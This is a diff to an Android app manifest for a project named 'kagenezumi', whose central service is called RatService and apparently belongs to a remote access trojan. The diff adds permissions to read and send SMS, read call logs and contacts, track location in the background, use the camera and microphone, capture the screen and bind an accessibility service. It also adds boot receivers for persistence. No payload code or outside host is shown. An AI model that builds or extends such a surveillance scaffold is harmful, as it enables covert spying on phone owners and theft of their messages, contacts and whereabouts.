@@ -2,27 +2,63 @@
     xmlns:tools="http://schemas.android.com/tools"
     package="com.example.kagenezumi">
 
-    <!-- Permissions -->
+    <!-- Basic Permissions -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    
+    <!-- Audio and Camera -->
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.CAMERA" />
-    <uses-permission android:name="android.permission.RECORD_AUDIO" />
-    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-
-    <uses-feature android:name="android.hardware.camera" android:required="true" />
-
-
-    <!-- Location Permissions (Both Fine and Coarse Location) -->
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+    
+    <!-- Location -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+    
+    <!-- Storage -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" 
+        tools:ignore="ScopedStorage" />
+    
+    <!-- SMS and Call -->
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    
+    <!-- System -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
+        tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    
+    <!-- Network -->
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    
+    <!-- Foreground Services -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-
-    <!-- Permissions for Foreground Services -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    
+    <!-- Screen Capture -->
+    <uses-permission android:name="android.permission.CAPTURE_VIDEO_OUTPUT" 
+        tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.CAPTURE_SECURE_VIDEO_OUTPUT" 
+        tools:ignore="ProtectedPermissions" />
+    
+    <!-- Accessibility -->
+    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"
+        tools:ignore="ProtectedPermissions" />
+
+    <uses-feature android:name="android.hardware.camera" android:required="true" />
 
     <!-- Application Configuration -->
     <application
@@ -32,6 +68,7 @@
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
         android:theme="@style/Theme.KageNezumi"
+        android:requestLegacyExternalStorage="true"
         tools:targetApi="31">
 
         <!-- Main Activity -->
@@ -50,47 +87,41 @@
             android:name=".RatService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="microphone"
+            android:foregroundServiceType="camera|microphone|location"
             android:permission="android.permission.FOREGROUND_SERVICE" />
 
+        <!-- Accessibility Service -->
         <service
-            android:name=".RatService"
+            android:name=".AccessibilityService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
+        <!-- Accessibility Receiver -->
+        <receiver
+            android:name=".AccessibilityReceiver"
             android:enabled="true"
-            android:exported="false"
-            android:foregroundServiceType="microphone"
-            android:permission="android.permission.FOREGROUND_SERVICE" />
-
-        <service
-            android:name=".RatService"
-            android:enabled="true"
-            android:exported="false"
-            android:foregroundServiceType="camera"
-            android:permission="android.permission.FOREGROUND_SERVICE" />
-
-        <service
-            android:name=".RatService"
-            android:enabled="true"
-            android:exported="false"
-            android:foregroundServiceType="location"
-            android:permission="android.permission.FOREGROUND_SERVICE" />
-
-
-
-        <service
-            android:name=".RatService"
-            android:enabled="true"
-            android:exported="false"
-            android:foregroundServiceType="location"
-            android:permission="android.permission.FOREGROUND_SERVICE" />
-
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.example.kagenezumi.ACTION_ACCESSIBILITY_EVENT" />
+            </intent-filter>
+        </receiver>
 
         <!-- BootReceiver to Start Service on Boot -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
-            android:exported="true">
+            android:exported="true"
+            android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
             </intent-filter>
         </receiver>
 
